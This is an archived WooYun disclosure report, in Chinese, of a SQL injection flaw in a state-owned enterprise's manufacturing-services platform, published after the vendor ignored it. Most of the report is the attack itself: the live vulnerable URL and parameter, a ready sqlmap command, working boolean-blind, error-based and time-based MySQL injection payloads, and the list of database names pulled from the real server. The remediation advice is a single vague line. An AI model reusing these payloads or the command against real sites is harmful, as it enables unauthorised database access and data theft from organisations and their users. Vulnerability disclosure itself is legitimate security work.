wybug_title: 首家央企“互联网+智能制造”产业服务平台主站存在SQL注射漏洞（可导致整站信息泄露）
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2015-06-17：	积极联系厂商并且等待厂商认领中，细节不对外公开									2015-08-01：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 昨晚看新闻联播，新闻报道中提到首家央企“互联网+智能制造”平台上线，于是拿出小本子记下了这个平台的网址。http://static.loner.fm/upload/201506/1710324708b273888e68c52aea9e6a9c885a2610.jpg 详细说明：  

注入点http://www.casicloud.com/capabilityListNew_v2.ht?type=2000SQLMAP测试方法：
python sqlmap.py -u "http://www.casicloud.com/capabilityListNew_v2.ht?type=2000" --dbs

sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: type (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: type=2000) AND 5379=5379 AND (5332=5332    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: type=2000) AND (SELECT 5214 FROM(SELECT COUNT(*),CONCAT(0x717a767671,(SELECT (CASE WHEN (5214=5214) THEN 1 ELSE 0 END)),0x7170706271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (9215=9215    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: type=2000) AND SLEEP(5) AND (9517=9517
   漏洞证明：  数据库列表：
available databases [6]:[*] cod[*] information_schema[*] mysql[*] test[*] tianzhi.v21[*] tianzhicloud
   修复方案：  加入安全判断   版权声明：转载请注明来源 猪猪侠@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
